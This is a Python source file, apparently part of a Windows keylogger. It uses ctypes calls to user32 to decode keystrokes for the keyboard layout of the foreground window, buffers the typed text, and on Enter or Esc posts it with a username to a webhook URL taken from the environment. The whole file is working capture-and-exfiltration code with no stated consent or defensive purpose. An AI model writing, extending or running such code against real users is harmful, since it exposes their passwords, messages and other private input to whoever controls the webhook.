import os
import requests
from dotenv import load_dotenv
from ctypes import wintypes
import ctypes

load_dotenv()

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
MAPVK_VK_TO_VSC_EX = 4

user32 = ctypes.WinDLL('user32', use_last_error=True)

user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.HKL]
user32.MapVirtualKeyExW.restype = wintypes.UINT

user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8 * 256)]
user32.GetKeyboardState.restype = wintypes.BOOL

user32.ToUnicodeEx.argtypes = [
    wintypes.UINT,
    wintypes.UINT,
    ctypes.POINTER(ctypes.c_uint8 * 256),
    wintypes.LPWSTR,
    ctypes.c_int,
    wintypes.UINT,
    wintypes.HKL
]
user32.ToUnicodeEx.restype = ctypes.c_int

user32.GetForegroundWindow.restype = wintypes.HWND
user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
user32.GetWindowThreadProcessId.restype = wintypes.DWORD
user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
user32.GetKeyboardLayout.restype = wintypes.HKL


class TextBuffer:
    def __init__(self, usernames):
        self.usernames: list = usernames
        self.buffer: str = ""
        self.init_buffer()

    def send_message(self) -> None:
        message = self.usernames[0] + ": " + self.buffer
        payload = {"content": message}
        requests.post(WEBHOOK_URL, data=payload)

    def init_buffer(self) -> None:
        self.buffer = ""

    def handle_char(self, character: str) -> None:
        self.buffer += character

    def handle_backspace(self) -> None:
        self.buffer = self.buffer[:-1]

    def handle_enter(self) -> None:
        self.send_message()
        self.init_buffer()

    def handle_space(self) -> None:
        self.buffer += " "

    def handle_esc(self) -> bool:
        self.send_message()
        return False


def get_bool(name: str, default: bool = False) -> bool:
    if name is None:
        return default
    return name.strip().lower() in ('1', 'true', 'yes', 'y', 'on')


def char_for_layout(vk, hkl):
    # first map the VK back to a scan code under that layout
    scan = user32.MapVirtualKeyExW(vk, MAPVK_VK_TO_VSC_EX, hkl)
    # then proceed exactly as before:
    ks = (ctypes.c_uint8 * 256)()
    user32.GetKeyboardState(ctypes.byref(ks))
    buf = ctypes.create_unicode_buffer(8)
    n = user32.ToUnicodeEx(vk, scan, ctypes.byref(ks), buf, len(buf), 0, hkl)
    return buf.value[:n] if n > 0 else ''


def decode_win(key):
    vk = key.vk
    hwnd = user32.GetForegroundWindow()
    pid = wintypes.DWORD()
    tid = user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    hkl = user32.GetKeyboardLayout(tid)
    return char_for_layout(vk, hkl)


def decode_none(key):
    return key.char
